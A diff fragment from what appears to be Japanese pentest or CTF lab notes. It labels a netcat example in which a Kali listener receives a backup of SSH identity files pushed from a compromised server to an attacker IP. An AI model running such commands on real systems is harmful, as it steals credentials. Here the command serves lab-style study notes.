@@ -920,8 +920,10 @@ pip install .
 
 ex:
 
+kali側:
 nc -lvnp 1337 > backup_ssh.tgz
 
+進入先のサーバー側:
 nc 10.10.14.2 1337 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
 
 ```
